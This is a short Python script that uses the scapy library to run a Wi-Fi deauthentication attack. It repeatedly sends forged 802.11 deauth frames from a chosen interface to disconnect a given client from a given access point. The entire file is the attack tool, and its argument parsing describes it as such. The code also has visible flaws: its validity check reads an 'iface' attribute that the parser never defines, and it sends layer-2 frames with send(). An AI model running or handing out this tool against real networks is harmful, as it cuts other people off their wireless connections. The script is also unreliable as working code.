#!/usr/bin/env python
# -*- coding: utf-8 -*-
# deauthattack.py
#
#   Author: k4m4

import logging, sys, argparse
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0

def sendPackets():
    pkt=RadioTap()/Dot11(addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth()
    for i in range(int(packetnum)):
        send(pkt)
    print("{} packets sent.".format(str(packetnum)))

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(usage="deauthattack.py {interface} [options]", description="Run a simple deauth attack")
    parser.add_argument("interface", help="Interface to use")
    parser.add_argument("-b", dest="bssid", help="BSSID address")
    parser.add_argument("-c", dest="client", help="Client address")
    parser.add_argument("-p", dest="packetnum", default=10, help="Total number of packets to send")
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    args = parser.parse_args()
    
    conf.iface = args.interface
    bssid = args.bssid
    client = args.client
    packetnum = args.packetnum

    if args.iface == None or args.bssid == None or args.client == None:
        print("Invalid options. Use -h or --help to view available options.")
        exit()

    try:
        sendPackets()
    except Exception as e:
        print(e)